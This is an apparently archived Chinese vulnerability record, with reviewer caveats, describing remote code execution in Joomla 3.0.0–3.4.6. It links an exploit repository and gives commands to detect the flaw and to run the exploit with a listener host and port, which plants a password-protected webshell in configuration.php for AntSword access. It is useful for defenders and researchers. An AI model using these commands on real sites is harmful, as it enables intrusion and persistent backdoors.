---
source: "hatch 补库批 20260928"
product: "Joomla3.0.0–3.4.6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Joomla 3-3.4.6 远程命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：test.py依赖、认证/配置条件完全未说明"
side_effects: "未执行；本文需注意的操作影响：声称写configuration.php随机口令shell有持久修改副作用，应标清；lhost/lport链需环境"
source_status: "unknown"
id: "vw-795fb46ddae2b485879c511b"
entity_id: "ve-795fb46ddae2b485879c511b"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：test.py依赖、认证/配置条件完全未说明

- **事实待核（1）**：文章只命令和截图，没有代码/机制/CVE；脚本显示Vulnerable不是独立证明。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **实验改动边界（2）**：声称写configuration.php随机口令shell有持久修改副作用，应标清；lhost/lport链需环境。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

- **证据待核（3）**：末尾蚁剑测试只有image占位；仓库出处有用但不能替代本地文本证据。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Joomla 3.4.6 - \'configuration.php\' 远程代码执行

一、漏洞简介
------------

Joomla 3.4.6 - \'configuration.php\' Remote Code Execution

二、影响范围
------------

Joomla 3.0.0 至 3.4.6

三、复现过程
------------

<https://github.com/ianxtianxt/Joomla-3.4.6---configuration.php-Remote-Code-Execution>

### 脚本验证

验证：

    python3 test.py -t http://127.0.0.1:8080/

![](./.resource/Joomla3-3.4.6远程命令执行漏洞/media/rId26.png)

显示"Vulnerable"证明存在漏洞

利用：

    python3 test.py -t http://127.0.0.1:8080/ --exploit --lhost 192.168.31.126 --lport 2121

![](./.resource/Joomla3-3.4.6远程命令执行漏洞/media/rId27.png)

执行成功

并在"configuration.php"写入**随机密码**的一句话木马
![](./.resource/Joomla3-3.4.6远程命令执行漏洞/media/rId28.png)
上图的密码为：kyevgbxjmwivdvegohfzwuukuzswxqquthlrsollpxzgiifumi

蚁剑链接测试

image
